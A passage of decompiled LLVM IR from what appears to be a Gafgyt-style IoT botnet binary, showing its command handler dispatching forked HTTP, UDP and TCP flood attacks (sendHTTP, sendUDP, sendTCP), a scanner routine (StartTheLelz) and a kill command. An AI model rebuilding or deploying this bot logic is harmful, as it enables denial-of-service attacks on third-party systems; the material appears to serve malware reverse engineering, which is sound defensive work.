  %v4_d544 = call i32 @__GI_strcoll(i8* %v3_d544, i32 ptrtoint ([5 x i8]* @global_var_19438.51 to i32))
  %v2_d54c = icmp eq i32 %v4_d544, 0
  br i1 %v2_d54c, label %dec_label_pc_d554, label %dec_label_pc_d56c

dec_label_pc_d554:                                ; preds = %entry
  %v2_d558 = load i32, i32* @global_var_23b28.49, align 4
  %v3_d564 = call i32 @Rootsprintf(i32 %v2_d558, i32 ptrtoint ([6 x i8]* @global_var_197ac.493 to i32))
  br label %dec_label_pc_e108

dec_label_pc_d56c:                                ; preds = %entry
  %v2_d570 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_197b4.495 to i32), i32* @r1, align 4
  %v3_d57c = inttoptr i32 %v2_d570 to i8*
  %v4_d57c = call i32 @__GI_strcoll(i8* %v3_d57c, i32 ptrtoint ([6 x i8]* @global_var_197b4.495 to i32))
  %v2_d584 = icmp eq i32 %v4_d57c, 0
  br i1 %v2_d584, label %dec_label_pc_d58c, label %dec_label_pc_d680

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d56c
  %v1_d590 = add i32 %tmp, 4
  %v1_d594 = inttoptr i32 %v1_d590 to i32*
  %v2_d594 = load i32, i32* %v1_d594, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197bc.497 to i32), i32* @r1, align 4
  %v3_d5a0 = inttoptr i32 %v2_d594 to i8*
  %v4_d5a0 = call i32 @__GI_strcoll(i8* %v3_d5a0, i32 ptrtoint ([4 x i8]* @global_var_197bc.497 to i32))
  %v2_d5a8 = icmp eq i32 %v4_d5a0, 0
  br i1 %v2_d5a8, label %dec_label_pc_d5b0, label %dec_label_pc_d5f4

dec_label_pc_d5b0:                                ; preds = %dec_label_pc_d58c
  %v2_d5b4 = load i32, i32* @global_var_29db0.499, align 4
  %v2_d5b8 = icmp eq i32 %v2_d5b4, 0
  br i1 %v2_d5b8, label %dec_label_pc_e108, label %dec_label_pc_d5c0

dec_label_pc_d5c0:                                ; preds = %dec_label_pc_d5b0
  %v0_d5d0 = call i32 @kill()
  %v2_d5d8 = load i32, i32* @global_var_23b28.49, align 4
  %v3_d5e4 = call i32 @Rootsprintf(i32 %v2_d5d8, i32 ptrtoint ([14 x i8]* @global_var_197c0.501 to i32))
  store i32 0, i32* @global_var_29db0.499, align 4
  br label %dec_label_pc_d5f4

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d58c, %dec_label_pc_d5c0
  %v2_d5fc = load i32, i32* %v1_d594, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197d0.503 to i32), i32* @r1, align 4
  %v3_d608 = inttoptr i32 %v2_d5fc to i8*
  %v4_d608 = call i32 @__GI_strcoll(i8* %v3_d608, i32 ptrtoint ([3 x i8]* @global_var_197d0.503 to i32))
  %v2_d610 = icmp eq i32 %v4_d608, 0
  br i1 %v2_d610, label %dec_label_pc_d618, label %dec_label_pc_d680

dec_label_pc_d618:                                ; preds = %dec_label_pc_d5f4
  %v2_d61c = load i32, i32* @global_var_29db0.499, align 4
  %v2_d620 = icmp eq i32 %v2_d61c, 0
  br i1 %v2_d620, label %dec_label_pc_d628, label %dec_label_pc_e108

dec_label_pc_d628:                                ; preds = %dec_label_pc_d618
  %v0_d628 = call i32 @__libc_fork()
  %v2_d648 = icmp eq i32 %v0_d628, 0
  br i1 %v2_d648, label %dec_label_pc_d66c, label %dec_label_pc_d650

dec_label_pc_d650:                                ; preds = %dec_label_pc_d628
  store i32 %v0_d628, i32* @global_var_29db0.499, align 4
  br label %dec_label_pc_e108

dec_label_pc_d66c:                                ; preds = %dec_label_pc_d628
  %v2_d674 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_d67c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_d680:                                ; preds = %dec_label_pc_d5f4, %dec_label_pc_d56c
  %v2_d684 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_197d4.505 to i32), i32* @r1, align 4
  %v3_d690 = inttoptr i32 %v2_d684 to i8*
  %v4_d690 = call i32 @__GI_strcoll(i8* %v3_d690, i32 ptrtoint ([5 x i8]* @global_var_197d4.505 to i32))
  %v2_d698 = icmp eq i32 %v4_d690, 0
  br i1 %v2_d698, label %dec_label_pc_d6a0, label %dec_label_pc_d814

dec_label_pc_d6a0:                                ; preds = %dec_label_pc_d680
  %v7_d6a8 = icmp slt i32 %arg1, 6
  br i1 %v7_d6a8, label %dec_label_pc_e108, label %dec_label_pc_d6ac

dec_label_pc_d6ac:                                ; preds = %dec_label_pc_d6a0
  %v1_d6b0 = add i32 %tmp, 12
  %v1_d6b4 = inttoptr i32 %v1_d6b0 to i32*
  %v2_d6b4 = load i32, i32* %v1_d6b4, align 4
  store i32 %v2_d6b4, i32* @r0, align 4
  %v1_d6bc = call i32 @atol(i32 %v2_d6b4)
  %tmp88 = icmp slt i32 %v1_d6bc, 1
  br i1 %tmp88, label %dec_label_pc_e108, label %dec_label_pc_d6cc

dec_label_pc_d6cc:                                ; preds = %dec_label_pc_d6ac
  %v1_d6d0 = add i32 %tmp, 20
  %v1_d6d4 = inttoptr i32 %v1_d6d0 to i32*
  %v2_d6d4 = load i32, i32* %v1_d6d4, align 4
  store i32 %v2_d6d4, i32* @r0, align 4
  %v1_d6dc = call i32 @atol(i32 %v2_d6d4)
  %v5_d6e8 = icmp sgt i32 %v1_d6dc, 0
  br i1 %v5_d6e8, label %dec_label_pc_d6f0, label %dec_label_pc_e108

dec_label_pc_d6f0:                                ; preds = %dec_label_pc_d6cc
  %v0_d6f0 = call i32 @listFork()
  %v2_d6f8 = icmp eq i32 %v0_d6f0, 0
  br i1 %v2_d6f8, label %dec_label_pc_d700, label %dec_label_pc_e108

dec_label_pc_d700:                                ; preds = %dec_label_pc_d6f0
  %v2_d704 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_d704, i32* @r5, align 4
  %v1_d70c = add i32 %tmp, 4
  %v1_d710 = inttoptr i32 %v1_d70c to i32*
  %v2_d710 = load i32, i32* %v1_d710, align 4
  store i32 %v2_d710, i32* @r6, align 4
  %v1_d718 = add i32 %tmp, 8
  %v1_d71c = inttoptr i32 %v1_d718 to i32*
  %v2_d71c = load i32, i32* %v1_d71c, align 4
  store i32 %v2_d71c, i32* @r7, align 4
  %v2_d728 = load i32, i32* %v1_d6b4, align 4
  store i32 %v2_d728, i32* @r0, align 4
  %v1_d730 = call i32 @atol(i32 %v2_d728)
  store i32 %v1_d730, i32* @r4, align 4
  %v2_d740 = load i32, i32* %v1_d6d4, align 4
  store i32 %v2_d740, i32* @r0, align 4
  %v1_d748 = call i32 @atol(i32 %v2_d740)
  %v0_d758 = load i32, i32* @r5, align 4
  %v0_d760 = load i32, i32* @r6, align 4
  store i32 %v0_d760, i32* @r2, align 4
  %v3_d768 = call i32 @Rootsprintf(i32 %v0_d758, i32 ptrtoint ([38 x i8]* @global_var_197dc.507 to i32))
  %v2_d774 = load i32, i32* %v1_d710, align 4
  store i32 %v2_d774, i32* @r5, align 4
  %v2_d784 = load i32, i32* %v1_d71c, align 4
  store i32 %v2_d784, i32* @r6, align 4
  %v2_d794 = load i32, i32* %v1_d6b4, align 4
  store i32 %v2_d794, i32* @r0, align 4
  %v1_d79c = call i32 @atol(i32 %v2_d794)
  %v3_d7a8 = urem i32 %v1_d79c, 65536
  store i32 %v3_d7a8, i32* @r7, align 4
  %v1_d7b4 = add i32 %tmp, 16
  %v1_d7b8 = inttoptr i32 %v1_d7b4 to i32*
  %v2_d7b8 = load i32, i32* %v1_d7b8, align 4
  store i32 %v2_d7b8, i32* @r8, align 4
  %v2_d7c8 = load i32, i32* %v1_d6d4, align 4
  store i32 %v2_d7c8, i32* @r0, align 4
  %v1_d7d0 = call i32 @atol(i32 %v2_d7c8)
  store i32 %v1_d7d0, i32* @r4, align 4
  %v1_d7dc = add i32 %tmp, 24
  %v1_d7e0 = inttoptr i32 %v1_d7dc to i32*
  %v2_d7e0 = load i32, i32* %v1_d7e0, align 4
  store i32 %v2_d7e0, i32* @r0, align 4
  %v1_d7e8 = call i32 @atol(i32 %v2_d7e0)
  %v0_d7f0 = load i32, i32* @r4, align 4
  %v0_d7f8 = load i32, i32* @r5, align 4
  %v0_d7fc = load i32, i32* @r6, align 4
  %v0_d800 = load i32, i32* @r7, align 4
  %v0_d804 = load i32, i32* @r8, align 4
  %v6_d808 = trunc i32 %v0_d800 to i8
  %v7_d808 = call i32 @sendHTTP(i32 %v0_d7f8, i32 %v0_d7fc, i8 %v6_d808, i32 %v0_d804, i32 %v0_d7f0, i32 %v1_d7e8)
  %v1_d810 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d814

dec_label_pc_d814:                                ; preds = %dec_label_pc_d680, %dec_label_pc_d700
  %v2_d818 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19804.509 to i32), i32* @r1, align 4
  %v3_d824 = inttoptr i32 %v2_d818 to i8*
  %v4_d824 = call i32 @__GI_strcoll(i8* %v3_d824, i32 ptrtoint ([4 x i8]* @global_var_19804.509 to i32))
  %v2_d82c = icmp eq i32 %v4_d824, 0
  br i1 %v2_d82c, label %dec_label_pc_d834, label %dec_label_pc_db94

dec_label_pc_d834:                                ; preds = %dec_label_pc_d814
  %v7_d83c = icmp slt i32 %arg1, 6
  br i1 %v7_d83c, label %dec_label_pc_d954, label %dec_label_pc_d840

dec_label_pc_d840:                                ; preds = %dec_label_pc_d834
  %v1_d844 = add i32 %tmp, 12
  %v1_d848 = inttoptr i32 %v1_d844 to i32*
  %v2_d848 = load i32, i32* %v1_d848, align 4
  store i32 %v2_d848, i32* @r0, align 4
  %v1_d850 = call i32 @atol(i32 %v2_d848)
  %v7_d858 = icmp eq i32 %v1_d850, -1
  br i1 %v7_d858, label %dec_label_pc_d954, label %dec_label_pc_d860

dec_label_pc_d860:                                ; preds = %dec_label_pc_d840
  %v1_d864 = add i32 %tmp, 8
  %v1_d868 = inttoptr i32 %v1_d864 to i32*
  %v2_d868 = load i32, i32* %v1_d868, align 4
  store i32 %v2_d868, i32* @r0, align 4
  %v1_d870 = call i32 @atol(i32 %v2_d868)
  %v7_d878 = icmp eq i32 %v1_d870, -1
  br i1 %v7_d878, label %dec_label_pc_d954, label %dec_label_pc_d880

dec_label_pc_d880:                                ; preds = %dec_label_pc_d860
  %v1_d884 = add i32 %tmp, 16
  %v1_d888 = inttoptr i32 %v1_d884 to i32*
  %v2_d888 = load i32, i32* %v1_d888, align 4
  store i32 %v2_d888, i32* @r0, align 4
  %v1_d890 = call i32 @atol(i32 %v2_d888)
  %v7_d898 = icmp eq i32 %v1_d890, -1
  br i1 %v7_d898, label %dec_label_pc_d954, label %dec_label_pc_d8a0

dec_label_pc_d8a0:                                ; preds = %dec_label_pc_d880
  %v1_d8a4 = add i32 %tmp, 20
  %v1_d8a8 = inttoptr i32 %v1_d8a4 to i32*
  %v2_d8a8 = load i32, i32* %v1_d8a8, align 4
  store i32 %v2_d8a8, i32* @r0, align 4
  %v1_d8b0 = call i32 @atol(i32 %v2_d8a8)
  %v7_d8b8 = icmp eq i32 %v1_d8b0, -1
  br i1 %v7_d8b8, label %dec_label_pc_d954, label %dec_label_pc_d8c0

dec_label_pc_d8c0:                                ; preds = %dec_label_pc_d8a0
  %v2_d8c8 = load i32, i32* %v1_d8a8, align 4
  store i32 %v2_d8c8, i32* @r0, align 4
  %v1_d8d0 = call i32 @atol(i32 %v2_d8c8)
  %v8_d8dc = icmp sgt i32 %v1_d8d0, 65536
  br i1 %v8_d8dc, label %dec_label_pc_d954, label %dec_label_pc_d8e0

dec_label_pc_d8e0:                                ; preds = %dec_label_pc_d8c0
  %v2_d8e8 = load i32, i32* %v1_d8a8, align 4
  store i32 %v2_d8e8, i32* @r0, align 4
  %v1_d8f0 = call i32 @atol(i32 %v2_d8e8)
  store i32 %v1_d8f0, i32* @r2, align 4
  %v8_d904 = icmp sgt i32 %v1_d8f0, add (i32 ptrtoint (i32* @global_var_ff00.45 to i32), i32 220)
  br i1 %v8_d904, label %dec_label_pc_d954, label %dec_label_pc_d908

dec_label_pc_d908:                                ; preds = %dec_label_pc_d8e0
  %v2_d910 = load i32, i32* %v1_d888, align 4
  store i32 %v2_d910, i32* @r0, align 4
  %v1_d918 = call i32 @atol(i32 %v2_d910)
  %v8_d924 = icmp sgt i32 %v1_d918, 32
  br i1 %v8_d924, label %dec_label_pc_d954, label %dec_label_pc_d928

dec_label_pc_d928:                                ; preds = %dec_label_pc_d908
  %v7_d92c = icmp eq i32 %arg1, 7
  br i1 %v7_d92c, label %dec_label_pc_d934, label %dec_label_pc_d96c

dec_label_pc_d934:                                ; preds = %dec_label_pc_d928
  %v1_d938 = add i32 %tmp, 24
  %v1_d93c = inttoptr i32 %v1_d938 to i32*
  %v2_d93c = load i32, i32* %v1_d93c, align 4
  store i32 %v2_d93c, i32* @r0, align 4
  %v1_d944 = call i32 @atol(i32 %v2_d93c)
  %v5_d950 = icmp sgt i32 %v1_d944, 0
  br i1 %v5_d950, label %dec_label_pc_d96c, label %dec_label_pc_d954

dec_label_pc_d954:                                ; preds = %dec_label_pc_d934, %dec_label_pc_d908, %dec_label_pc_d8e0, %dec_label_pc_d8c0, %dec_label_pc_d8a0, %dec_label_pc_d880, %dec_label_pc_d860, %dec_label_pc_d840, %dec_label_pc_d834
  %v2_d958 = load i32, i32* @global_var_23b28.49, align 4
  %v3_d964 = call i32 @Rootsprintf(i32 %v2_d958, i32 ptrtoint ([113 x i8]* @global_var_19808.511 to i32))
  br label %dec_label_pc_e108

dec_label_pc_d96c:                                ; preds = %dec_label_pc_d928, %dec_label_pc_d934
  %v1_d970 = add i32 %tmp, 4
  %v1_d974 = inttoptr i32 %v1_d970 to i32*
  %v2_d974 = load i32, i32* %v1_d974, align 4
  %v2_d984 = load i32, i32* %v1_d868, align 4
  store i32 %v2_d984, i32* @r0, align 4
  %v1_d98c = call i32 @atol(i32 %v2_d984)
  %v2_d9a0 = load i32, i32* %v1_d848, align 4
  store i32 %v2_d9a0, i32* @r0, align 4
  %v1_d9a8 = call i32 @atol(i32 %v2_d9a0)
  %v2_d9bc = load i32, i32* %v1_d888, align 4
  store i32 %v2_d9bc, i32* @r0, align 4
  %v1_d9c4 = call i32 @atol(i32 %v2_d9bc)
  %v2_d9d8 = load i32, i32* %v1_d8a8, align 4
  store i32 %v2_d9d8, i32* @r0, align 4
  %v1_d9e0 = call i32 @atol(i32 %v2_d9d8)
  %v7_d9f4 = icmp slt i32 %arg1, 7
  br i1 %v7_d9f4, label %dec_label_pc_da14, label %dec_label_pc_d9f8

dec_label_pc_d9f8:                                ; preds = %dec_label_pc_d96c
  %v1_d9fc = add i32 %tmp, 24
  %v1_da00 = inttoptr i32 %v1_d9fc to i32*
  %v2_da00 = load i32, i32* %v1_da00, align 4
  store i32 %v2_da00, i32* @r0, align 4
  %v1_da08 = call i32 @atol(i32 %v2_da00)
  br label %dec_label_pc_da1c

dec_label_pc_da14:                                ; preds = %dec_label_pc_d96c
  br label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %dec_label_pc_d9f8, %dec_label_pc_da14
  %storemerge8 = phi i32 [ 1000, %dec_label_pc_da14 ], [ %v1_da08, %dec_label_pc_d9f8 ]
  %v7_da2c = icmp slt i32 %arg1, 8
  br i1 %v7_da2c, label %dec_label_pc_da4c, label %dec_label_pc_da30

dec_label_pc_da30:                                ; preds = %dec_label_pc_da1c
  %v1_da34 = add i32 %tmp, 28
  %v1_da38 = inttoptr i32 %v1_da34 to i32*
  %v2_da38 = load i32, i32* %v1_da38, align 4
  store i32 %v2_da38, i32* @r0, align 4
  %v1_da40 = call i32 @atol(i32 %v2_da38)
  br label %dec_label_pc_da60

dec_label_pc_da4c:                                ; preds = %dec_label_pc_da1c
  br label %dec_label_pc_da60

dec_label_pc_da60:                                ; preds = %dec_label_pc_da30, %dec_label_pc_da4c
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_da4c ], [ %v1_da40, %dec_label_pc_da30 ]
  %v7_da70 = icmp slt i32 %arg1, 9
  br i1 %v7_da70, label %dec_label_pc_da90, label %dec_label_pc_da74

dec_label_pc_da74:                                ; preds = %dec_label_pc_da60
  %v1_da78 = add i32 %tmp, 32
  %v1_da7c = inttoptr i32 %v1_da78 to i32*
  %v2_da7c = load i32, i32* %v1_da7c, align 4
  store i32 %v2_da7c, i32* @r0, align 4
  %v1_da84 = call i32 @atol(i32 %v2_da7c)
  br label %dec_label_pc_da98

dec_label_pc_da90:                                ; preds = %dec_label_pc_da60
  br label %dec_label_pc_da98

dec_label_pc_da98:                                ; preds = %dec_label_pc_da74, %dec_label_pc_da90
  %storemerge6 = phi i32 [ 0, %dec_label_pc_da90 ], [ %v1_da84, %dec_label_pc_da74 ]
  %v2_daac = call i32 @__GI_strchr(i32 %v2_d974, i32 44)
  %v2_dab4 = icmp eq i32 %v2_daac, 0
  br i1 %v2_dab4, label %dec_label_pc_db48, label %dec_label_pc_dabc

dec_label_pc_dabc:                                ; preds = %dec_label_pc_da98
  store i32 %v2_d974, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_dac8 = call i32 @__GI_strtok(i32 %v2_d974, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  %v2_db3c21 = icmp eq i32 %v2_dac8, 0
  br i1 %v2_db3c21, label %dec_label_pc_e108, label %dec_label_pc_dad8

dec_label_pc_dad8:                                ; preds = %dec_label_pc_dabc, %dec_label_pc_db24
  %storemerge1522 = phi i32 [ %v2_db2c, %dec_label_pc_db24 ], [ %v2_dac8, %dec_label_pc_dabc ]
  %v0_dad8 = call i32 @listFork()
  %v2_dae0 = icmp eq i32 %v0_dad8, 0
  br i1 %v2_dae0, label %dec_label_pc_dae8, label %dec_label_pc_db24

dec_label_pc_dae8:                                ; preds = %dec_label_pc_dad8
  %v8_db18 = call i32 @sendUDP(i32 %storemerge1522, i32 %v1_d98c, i32 %v1_d9a8, i32 %v1_d9c4, i32 %v1_d9e0, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_db20 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_db24:                                ; preds = %dec_label_pc_dad8
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_db2c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  %v2_db3c = icmp eq i32 %v2_db2c, 0
  br i1 %v2_db3c, label %dec_label_pc_e108, label %dec_label_pc_dad8

dec_label_pc_db48:                                ; preds = %dec_label_pc_da98
  %v0_db48 = call i32 @listFork()
  %v2_db50 = icmp eq i32 %v0_db48, 0
  br i1 %v2_db50, label %dec_label_pc_db58, label %dec_label_pc_e108

dec_label_pc_db58:                                ; preds = %dec_label_pc_db48
  %v8_db88 = call i32 @sendUDP(i32 %v2_d974, i32 %v1_d98c, i32 %v1_d9a8, i32 %v1_d9c4, i32 %v1_d9e0, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_db90 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_db94:                                ; preds = %dec_label_pc_d814
  %v2_db98 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1987c.514 to i32), i32* @r1, align 4
  %v3_dba4 = inttoptr i32 %v2_db98 to i8*
  %v4_dba4 = call i32 @__GI_strcoll(i8* %v3_dba4, i32 ptrtoint ([4 x i8]* @global_var_1987c.514 to i32))
  %v2_dbac = icmp eq i32 %v4_dba4, 0
  br i1 %v2_dbac, label %dec_label_pc_dbb4, label %dec_label_pc_de78

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_db94
  %v7_dbbc = icmp slt i32 %arg1, 6
  br i1 %v7_dbbc, label %dec_label_pc_dc98, label %dec_label_pc_dbc0

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_dbb4
  %v1_dbc4 = add i32 %tmp, 12
  %v1_dbc8 = inttoptr i32 %v1_dbc4 to i32*
  %v2_dbc8 = load i32, i32* %v1_dbc8, align 4
  store i32 %v2_dbc8, i32* @r0, align 4
  %v1_dbd0 = call i32 @atol(i32 %v2_dbc8)
  %v7_dbd8 = icmp eq i32 %v1_dbd0, -1
  br i1 %v7_dbd8, label %dec_label_pc_dc98, label %dec_label_pc_dbe0

dec_label_pc_dbe0:                                ; preds = %dec_label_pc_dbc0
  %v1_dbe4 = add i32 %tmp, 8
  %v1_dbe8 = inttoptr i32 %v1_dbe4 to i32*
  %v2_dbe8 = load i32, i32* %v1_dbe8, align 4
  store i32 %v2_dbe8, i32* @r0, align 4
  %v1_dbf0 = call i32 @atol(i32 %v2_dbe8)
  %v7_dbf8 = icmp eq i32 %v1_dbf0, -1
  br i1 %v7_dbf8, label %dec_label_pc_dc98, label %dec_label_pc_dc00

dec_label_pc_dc00:                                ; preds = %dec_label_pc_dbe0
  %v1_dc04 = add i32 %tmp, 16
  %v1_dc08 = inttoptr i32 %v1_dc04 to i32*
  %v2_dc08 = load i32, i32* %v1_dc08, align 4
  store i32 %v2_dc08, i32* @r0, align 4
  %v1_dc10 = call i32 @atol(i32 %v2_dc08)
  %v7_dc18 = icmp eq i32 %v1_dc10, -1
  br i1 %v7_dc18, label %dec_label_pc_dc98, label %dec_label_pc_dc20

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dc00
  %v2_dc28 = load i32, i32* %v1_dc08, align 4
  store i32 %v2_dc28, i32* @r0, align 4
  %v1_dc30 = call i32 @atol(i32 %v2_dc28)
  %v8_dc3c = icmp sgt i32 %v1_dc30, 32
  br i1 %v8_dc3c, label %dec_label_pc_dc98, label %dec_label_pc_dc40

dec_label_pc_dc40:                                ; preds = %dec_label_pc_dc20
  %v7_dc48 = icmp slt i32 %arg1, 7
  br i1 %v7_dc48, label %dec_label_pc_dc6c, label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc40
  %v1_dc50 = add i32 %tmp, 24
  %v1_dc54 = inttoptr i32 %v1_dc50 to i32*
  %v2_dc54 = load i32, i32* %v1_dc54, align 4
  store i32 %v2_dc54, i32* @r0, align 4
  %v1_dc5c = call i32 @atol(i32 %v2_dc54)
  %v1_dc64 = icmp slt i32 %v1_dc5c, 0
  br i1 %v1_dc64, label %dec_label_pc_dc98, label %dec_label_pc_dc6c

dec_label_pc_dc6c:                                ; preds = %dec_label_pc_dc4c, %dec_label_pc_dc40
  %v7_dc70 = icmp eq i32 %arg1, 8
  br i1 %v7_dc70, label %dec_label_pc_dc78, label %dec_label_pc_dcb0

dec_label_pc_dc78:                                ; preds = %dec_label_pc_dc6c
  %v1_dc7c = add i32 %tmp, 28
  %v1_dc80 = inttoptr i32 %v1_dc7c to i32*
  %v2_dc80 = load i32, i32* %v1_dc80, align 4
  store i32 %v2_dc80, i32* @r0, align 4
  %v1_dc88 = call i32 @atol(i32 %v2_dc80)
  %v5_dc94 = icmp sgt i32 %v1_dc88, 0
  br i1 %v5_dc94, label %dec_label_pc_dcb0, label %dec_label_pc_dc98

dec_label_pc_dc98:                                ; preds = %dec_label_pc_dc78, %dec_label_pc_dc4c, %dec_label_pc_dc20, %dec_label_pc_dc00, %dec_label_pc_dbe0, %dec_label_pc_dbc0, %dec_label_pc_dbb4
  %v2_dc9c = load i32, i32* @global_var_23b28.49, align 4
  %v3_dca8 = call i32 @Rootsprintf(i32 %v2_dc9c, i32 ptrtoint ([186 x i8]* @global_var_19880.516 to i32))
  br label %dec_label_pc_e108

dec_label_pc_dcb0:                                ; preds = %dec_label_pc_dc6c, %dec_label_pc_dc78
  %v1_dcb4 = add i32 %tmp, 4
  %v1_dcb8 = inttoptr i32 %v1_dcb4 to i32*
  %v2_dcb8 = load i32, i32* %v1_dcb8, align 4
  %v2_dcc8 = load i32, i32* %v1_dbe8, align 4
  store i32 %v2_dcc8, i32* @r0, align 4
  %v1_dcd0 = call i32 @atol(i32 %v2_dcc8)
  %v2_dce4 = load i32, i32* %v1_dbc8, align 4
  store i32 %v2_dce4, i32* @r0, align 4
  %v1_dcec = call i32 @atol(i32 %v2_dce4)
  %v2_dd00 = load i32, i32* %v1_dc08, align 4
  store i32 %v2_dd00, i32* @r0, align 4
  %v1_dd08 = call i32 @atol(i32 %v2_dd00)
  %v1_dd18 = add i32 %tmp, 20
  %v1_dd1c = inttoptr i32 %v1_dd18 to i32*
  %v2_dd1c = load i32, i32* %v1_dd1c, align 4
  br i1 %v7_dc70, label %dec_label_pc_dd30, label %dec_label_pc_dd4c

dec_label_pc_dd30:                                ; preds = %dec_label_pc_dcb0
  %v1_dd34 = add i32 %tmp, 28
  %v1_dd38 = inttoptr i32 %v1_dd34 to i32*
  %v2_dd38 = load i32, i32* %v1_dd38, align 4
  store i32 %v2_dd38, i32* @r0, align 4
  %v1_dd40 = call i32 @atol(i32 %v2_dd38)
  br label %dec_label_pc_dd54

dec_label_pc_dd4c:                                ; preds = %dec_label_pc_dcb0
  br label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd30, %dec_label_pc_dd4c
  %storemerge5 = phi i32 [ 10, %dec_label_pc_dd4c ], [ %v1_dd40, %dec_label_pc_dd30 ]
  br i1 %v7_dc48, label %dec_label_pc_dd84, label %dec_label_pc_dd68

dec_label_pc_dd68:                                ; preds = %dec_label_pc_dd54
  %v1_dd6c = add i32 %tmp, 24
  %v1_dd70 = inttoptr i32 %v1_dd6c to i32*
  %v2_dd70 = load i32, i32* %v1_dd70, align 4
  store i32 %v2_dd70, i32* @r0, align 4
  %v1_dd78 = call i32 @atol(i32 %v2_dd70)
  br label %dec_label_pc_dd8c

dec_label_pc_dd84:                                ; preds = %dec_label_pc_dd54
  br label %dec_label_pc_dd8c

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dd68, %dec_label_pc_dd84
  %storemerge4 = phi i32 [ 0, %dec_label_pc_dd84 ], [ %v1_dd78, %dec_label_pc_dd68 ]
  %v2_dda0 = call i32 @__GI_strchr(i32 %v2_dcb8, i32 44)
  %v2_dda8 = icmp eq i32 %v2_dda0, 0
  br i1 %v2_dda8, label %dec_label_pc_de34, label %dec_label_pc_ddb0

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dd8c
  store i32 %v2_dcb8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_ddbc = call i32 @__GI_strtok(i32 %v2_dcb8, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  %v2_de2827 = icmp eq i32 %v2_ddbc, 0
  br i1 %v2_de2827, label %dec_label_pc_de78, label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_ddb0, %dec_label_pc_de10
  %storemerge1328 = phi i32 [ %v2_de18, %dec_label_pc_de10 ], [ %v2_ddbc, %dec_label_pc_ddb0 ]
  %v0_ddcc = call i32 @listFork()
  %v2_ddd4 = icmp eq i32 %v0_ddcc, 0
  br i1 %v2_ddd4, label %dec_label_pc_dddc, label %dec_label_pc_de10

dec_label_pc_dddc:                                ; preds = %dec_label_pc_ddcc
  %v7_de04 = call i32 @sendTCP(i32 %storemerge1328, i32 %v1_dcd0, i32 %v1_dcec, i32 %v1_dd08, i32 %v2_dd1c, i32 %storemerge4, i32 %storemerge5)
  %v1_de0c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_de10:                                ; preds = %dec_label_pc_ddcc
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_de18 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  %v2_de28 = icmp eq i32 %v2_de18, 0
  br i1 %v2_de28, label %dec_label_pc_de78, label %dec_label_pc_ddcc

dec_label_pc_de34:                                ; preds = %dec_label_pc_dd8c
  %v0_de34 = call i32 @listFork()
  %v2_de3c = icmp eq i32 %v0_de34, 0
  br i1 %v2_de3c, label %dec_label_pc_de44, label %dec_label_pc_de78

dec_label_pc_de44:                                ; preds = %dec_label_pc_de34
  %v7_de6c = call i32 @sendTCP(i32 %v2_dcb8, i32 %v1_dcd0, i32 %v1_dcec, i32 %v1_dd08, i32 %v2_dd1c, i32 %storemerge4, i32 %storemerge5)
  %v1_de74 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_de78:                                ; preds = %dec_label_pc_de10, %dec_label_pc_ddb0, %dec_label_pc_de34, %dec_label_pc_db94
  %v2_de7c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1993c.518 to i32), i32* @r1, align 4
  %v3_de88 = inttoptr i32 %v2_de7c to i8*
  %v4_de88 = call i32 @__GI_strcoll(i8* %v3_de88, i32 ptrtoint ([4 x i8]* @global_var_1993c.518 to i32))
  %v2_de90 = icmp eq i32 %v4_de88, 0
  br i1 %v2_de90, label %dec_label_pc_de98, label %dec_label_pc_dff0

dec_label_pc_de98:                                ; preds = %dec_label_pc_de78
  %v7_dea0 = icmp slt i32 %arg1, 4
  br i1 %v7_dea0, label %dec_label_pc_dee4, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de98
  %v1_dea8 = add i32 %tmp, 8
  %v1_deac = inttoptr i32 %v1_dea8 to i32*
  %v2_deac = load i32, i32* %v1_deac, align 4
  store i32 %v2_deac, i32* @r0, align 4
  %v1_deb4 = call i32 @atol(i32 %v2_deac)
  %tmp89 = icmp slt i32 %v1_deb4, 1
  br i1 %tmp89, label %dec_label_pc_dee4, label %dec_label_pc_dec4

